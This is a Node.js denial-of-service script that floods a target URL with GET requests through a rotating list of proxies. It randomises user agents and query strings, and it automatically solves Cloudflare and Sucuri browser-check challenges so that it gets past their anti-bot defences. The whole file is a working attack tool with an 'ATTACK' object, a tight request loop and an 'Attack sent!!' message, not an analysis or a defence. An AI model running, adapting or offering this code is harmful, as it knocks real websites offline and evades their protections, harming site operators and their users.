var vm = require('vm');
var requestModule = require('request');
var jar = requestModule.jar();
var fs = require('fs');
var proxies = fs.readFileSync('proxy.txt', 'utf-8').replace(/\r/g, '').split('\n');
var rate = process.argv[4]
var request = requestModule.defaults({
        jar: jar
    }),
    UserAgents = ["Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.18247",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"],
    Timeout = 6000;

function performRequest(options, callback) {
    var method;
    options = options || {};
    options.headers = options.headers || {};
    makeRequest = requestMethod(options.method);

    //Can't just do the normal options.encoding || 'utf8'
    //because null is a valid encoding.
    if ('encoding' in options) {
        options.realEncoding = options.encoding;
    } else {
        options.realEncoding = 'utf8';
    }
    options.encoding = null;

    if (!options.url || !callback) {
        throw new Error('To perform request, define both url and callback');
    }

    options.headers['User-Agent'] = UserAgents[Math.floor(Math.random() * UserAgents.length)];

    makeRequest(options, function(error, response, body) {
        var validationError;
        var stringBody;

        if (error || !body || !body.toString) {
            return callback({
                errorType: 0,
                error: error
            }, body, response);
        }

        stringBody = body.toString('utf8');

        if (validationError = checkForErrors(error, stringBody)) {
            return callback(validationError, body, response);
        }

        // If body contains specified string, solve challenge
        if (stringBody.indexOf('a = document.getElementById(\'jschl-answer\');') !== -1) {
            setTimeout(function() {
                return solveChallenge(response, stringBody, options, callback);
            }, Timeout);
        } else if (stringBody.indexOf('Checking your browser before accessing') !== -1 ||
            stringBody.indexOf('sucuri_cloudproxy_js') !== -1 ||
            stringBody.indexOf('Verifying your browser, please wait...') !== -1) {
            setCookieAndReload(response, stringBody, options, callback);
        } else {
            // All is good
            processResponseBody(options, error, response, body, callback);
        }
    });
}

function checkForErrors(error, body) {
    var match;
    if (error) {
        return {
            errorType: 0,
            error: error
        };
    }
    if (body.indexOf('why_captcha') !== -1 || /cdn-cgi\/l\/chk_captcha/i.test(body)) {
        return {
            errorType: 1
        };
    }
    //'<span class="cf-error-code">1006</span>'
    match = body.match(/<\w+\s+class="cf-error-code">(.*)<\/\w+>/i);
    if (match) {
        return {
            errorType: 2,
            error: parseInt(match[1])
        };
    }
    return false;
}
function solveChallenge(response, body, options, callback) {
    var challenge = body.match(/name="jschl_vc" value="(\w+)"/),
        host = response.request.host,
        makeRequest = requestMethod(options.method),
        jsChlVc,
        answerResponse,
        answerUrl;
    if (!challenge) {
        return callback({
            errorType: 3,
            error: 'I cant extract challengeId (jschl_vc) from page'
        }, body, response);
    }
    jsChlVc = challenge[1];
    challenge = body.match(/getElementById\('cf-content'\)[\s\S]+?setTimeout.+?\r?\n([\s\S]+?a\.value =.+?)\r?\n/i);
    if (!challenge) {
        return callback({
            errorType: 3,
            error: 'I cant extract method from setTimeOut wrapper'
        }, body, response);
    }
    challenge_pass = body.match(/name="pass" value="(.+?)"/)[1];
    challenge = challenge[1];
    challenge = challenge.replace(/a\.value =(.+?) \+ .+?;/i, '$1');
    challenge = challenge.replace(/\s{3,}[a-z](?: = |\.).+/g, '');
    challenge = challenge.replace(/'; \d+'/g, '');
    try {
        answerResponse = {
            'jschl_vc': jsChlVc,
            'jschl_answer': (eval(challenge) + response.request.host.length),
            'pass': challenge_pass
        };
    } catch (err) {
        return callback({
            errorType: 3,
            error: 'Error occurred during evaluation: ' + err.message
        }, body, response);
    }
    answerUrl = response.request.uri.protocol + '//' + host + '/cdn-cgi/l/chk_jschl';
    options.headers['referer'] = response.request.uri.href; // Original url should be placed as referer
    options.url = answerUrl;
    options.qs = answerResponse;
    makeRequest(options, function(error, response, body) {

        if (error) {
            return callback({
                errorType: 0,
                error: error
            }, response, body);
        }

        if (response.statusCode === 302) {
            options.url = response.headers.location;
            delete options.qs;
            makeRequest(options, function(error, response, body) {
                processResponseBody(options, error, response, body, callback);
            });
        } else {
            processResponseBody(options, error, response, body, callback);
        }
    });
}

function setCookieAndReload(response, body, options, callback) {
    var challenge = body.match(/S='([^']+)'/);
    var makeRequest = requestMethod(options.method);

    if (!challenge) {
        return callback({
            errorType: 3,
            error: 'I cant extract cookie generation code from page'
        }, body, response);
    }

    var base64EncodedCode = challenge[1];
    var cookieSettingCode = new Buffer(base64EncodedCode, 'base64').toString('ascii');

    var sandbox = {
        location: {
            reload: function() {}
        },
        document: {}
    };
    vm.runInNewContext(cookieSettingCode, sandbox);
    try {
        jar.setCookie(sandbox.document.cookie, response.request.uri.href, {
            ignoreError: true
        });
    } catch (err) {
        return callback({
            errorType: 3,
            error: 'Error occurred during evaluation: ' + err.message
        }, body, response);
    }

    makeRequest(options, function(error, response, body) {
        if (error) {
            return callback({
                errorType: 0,
                error: error
            }, response, body);
        }
        processResponseBody(options, error, response, body, callback);
    });
}

// Workaround for better testing. Request has pretty poor API
function requestMethod(method) {
    // For now only GET and POST are supported
    method = method.toUpperCase();

    return method === 'POST' ? request.post : request.get;
}

function processResponseBody(options, error, response, body, callback) {
    if (typeof options.realEncoding === 'string') {
        body = body.toString(options.realEncoding);
        // In case of real encoding, try to validate the response
        // and find potential errors there.
        // If encoding is not provided, return response as it is
        if (validationError = checkForErrors(error, body)) {
            return callback(validationError, response, body);
        }
    }


    callback(error, response, body);
}

process.on('uncaughtException', function(err) {
console.log(err);
})

process.on('unhandledRejection', function(err) {
console.log(err);
});

var ATTACK = {
    http(method, url, proxy) {
        requestModule({
            method: method,
            proxy: 'http://' + proxy,
            json: false,
            headers: {
                'user-agent': UserAgents[Math.floor(Math.random() * UserAgents.length)],
                accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                'accept-encoding': "gzip, deflate, br",
                'accept-language': "en-US,en;q=0.9,he;q=0.8",
                "referer": url,
                'upgrade-insecure-requests': 1,
                'cache-control': "max-age=0"
            },
            url: url
            }, function(err, response, body) {
                console.log(err, response.statusCode);
            });
        },
    cfbypass(method, url, proxy) {
        performRequest({
            method: method,
            proxy: 'http://' + proxy,
            json: false,
            headers: {
                'user-agent': UserAgents[Math.floor(Math.random() * UserAgents.length)],
                accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                'accept-language': "en-US,en;q=0.9,he;q=0.8",
                "referer": url,
                'upgrade-insecure-requests': 1,
                'cache-control': "no-cache",
                "pragma": 'no-cache'
            },
            url: url
            }, function(err, response, body) {
              if (!err) {
                console.log(response.statusCode);
              }
            });
        }
}

setTimeout(function() {
    process.exit(1);
}, process.argv[3] * 1000);

setInterval(function() { 
    for (let j = 0; j < rate; j++) {
    ATTACK.cfbypass('GET', process.argv[2] + '?' +  Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + '=' +  Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), proxies[Math.floor(Math.random() * proxies.length)]);
    }
    });

console.log('Attack sent!!');


